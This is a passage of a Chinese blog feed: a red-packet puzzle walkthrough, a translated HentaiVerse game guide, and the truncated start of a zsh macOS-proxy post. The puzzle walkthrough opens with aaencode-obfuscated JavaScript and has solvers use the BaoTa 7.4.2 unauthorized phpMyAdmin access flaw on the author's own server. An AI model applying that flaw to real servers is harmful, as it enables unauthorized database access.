['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\">\n<div class=\"license-title\">[译] HentaiVerse 建议和指导</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-24</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 